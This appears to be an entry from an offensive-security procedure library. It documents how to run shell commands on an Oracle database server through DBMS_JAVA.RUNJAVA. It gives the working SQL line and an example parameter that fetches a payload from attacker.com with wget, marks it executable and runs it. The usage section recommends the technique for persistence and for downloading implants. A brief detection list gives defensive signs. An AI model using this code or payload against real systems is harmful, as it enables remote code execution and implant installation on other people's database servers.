---
id: a400bce8-2c6c-45e1-99c0-e4fe0c663400
name: execute-shell-command-via-dbms-java-runjava
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:35.305263+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Oracle Database
  - Linux
tags:
  - oracle
  - java
  - rce
  - shell-execution
validated: true
---

# execute-shell-command-via-dbms-java-runjava

## Code

```sql
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
```

## Description

This code invokes DBMS_JAVA.RUNJAVA to run a shell command through the Wrapper utility, ideal for Linux-based Oracle servers to perform file operations or execute payloads.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| '/bin/bash -c /bin/ls>/tmp/OUT.LST' | Shell command string | 'wget http://attacker.com/payload -O /tmp/payload; chmod +x /tmp/payload; /tmp/payload' |

## Usage

Execute after granting permissions for direct shell access. Use for persistence, like downloading and running implants. Verify by checking output files.

## Detection

- Logs of DBMS_JAVA.RUNJAVA calls.
- File system changes from redirected commands.
- Process monitoring showing bash/cmd spawned from oracle process.

## Related

- [[procedures/Oracle-SQL-and-Java-Command-Execution]]
